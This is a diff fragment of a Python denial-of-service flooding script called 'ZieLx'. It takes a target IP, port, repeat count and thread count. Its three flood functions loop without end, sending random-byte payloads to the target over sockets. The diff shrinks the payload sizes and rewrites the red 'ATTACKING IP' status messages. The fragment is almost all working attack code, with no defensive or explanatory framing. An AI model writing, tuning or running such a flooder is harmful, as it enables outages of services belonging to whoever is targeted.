@@ -50,7 +50,7 @@ times = int(input("[-] Times : "))
 threads = int(input("[+] Threads : "))
 os.system("clear")
 def ddos():
-	data = random._urandom(20000)
+	data = random._urandom(1024)
 	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
@@ -58,12 +58,12 @@ def ddos():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-                        print(i +"\u001b[31m ZieLx Attack DDoS In Ip Port\033[92m =====> {}:{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
 
 def ddos2():
-	data = random._urandom(696969)
+	data = random._urandom(1025)
 	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
@@ -72,13 +72,13 @@ def ddos2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[31m ZieLx Attack DDoS In Ip Port\033[92m =====> {}:{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
 			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
 
 def ddos3():
-	data = random._urandom(696969)
+	data = random._urandom(1025)
 	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
@@ -87,7 +87,7 @@ def ddos3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[31m ZieLx Attack DDoS In Ip Port\033[92m =====> {}:{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
 			print("\033[92m [!] MT KAH MANISZZZ?")
